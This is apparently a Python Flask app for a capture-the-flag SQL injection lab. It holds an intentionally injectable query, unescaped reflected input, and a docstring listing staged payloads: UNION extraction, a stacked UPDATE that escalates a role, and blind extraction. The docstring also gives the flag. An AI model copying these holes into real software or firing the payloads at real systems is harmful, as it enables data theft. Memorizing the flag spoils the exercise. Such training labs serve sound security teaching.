"""
SQL Injection Lab 20: Complex Multi-Technique SQL Injection
Difficulty: 4 (Expert)
Points: 150

Description:
Complex SQL injection combining multiple techniques.
"""

from flask import Flask, request
import sqlite3

app = Flask(__name__)

DB_PATH = '/tmp/sqli_20.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (id INTEGER PRIMARY KEY, username TEXT, email TEXT, role TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS audit_log 
                      (id INTEGER PRIMARY KEY, action TEXT, user_id INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin@example.com', 'admin')")
    cursor.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'user@example.com', 'user')")
    cursor.execute("INSERT OR IGNORE INTO audit_log VALUES (1, 'login', 1)")
    conn.commit()
    conn.close()

init_db()

@app.route('/search', methods=['GET', 'POST'])
def search():
    """
    VULNERABLE: Complex multi-technique SQL injection
    
    Stage 1 - Reconnaissance:
    /search?username=admin' ORDER BY 1 -- (column enumeration)
    
    Stage 2 - Data Extraction:
    /search?username=admin' UNION SELECT 1, username, email, role FROM users --
    
    Stage 3 - Escalation:
    /search?username=admin' AND (SELECT role FROM users WHERE username='admin')='admin' --
    Update role: /search?username=admin'); UPDATE users SET role='admin' WHERE username='user'); --
    
    Stage 4 - Blind extraction:
    /search?username=admin' AND SUBSTR(email,1,5)='admin' --
    
    Flag: FLAG{sql_injection_complex_multi_tech_020}
    """
    username = request.args.get('username', '')
    result = None
    
    if request.method == 'GET' and username:
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            
            # VULNERABLE: Multiple injection points
            query = f"SELECT id, username, email, role FROM users WHERE username LIKE '%{username}%'"
            cursor.execute(query)
            users = cursor.fetchall()
            
            result = ""
            if users:
                result = "<table border='1'><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>"
                for user in users:
                    result += f"<tr><td>{user[0]}</td><td>{user[1]}</td><td>{user[2]}</td><td>{user[3]}</td></tr>"
                result += "</table>"
            else:
                result = "No users found"
            
            conn.close()
        except Exception as e:
            result = f"Error: {str(e)}"
    
    return f"""
    <html>
    <body>
        <h1>User Search</h1>
        <form method="GET">
            <input type="text" name="username" placeholder="Username" value="{username}">
            <button>Search</button>
        </form>
        {result if result else ""}
        <hr>
        <p><strong>Tips:</strong></p>
        <ul>
            <li>Try: admin' ORDER BY 1 --</li>
            <li>Try: admin' UNION SELECT 1,2,3,4 --</li>
            <li>Try: %' OR '1'='1</li>
        </ul>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5020, debug=False)
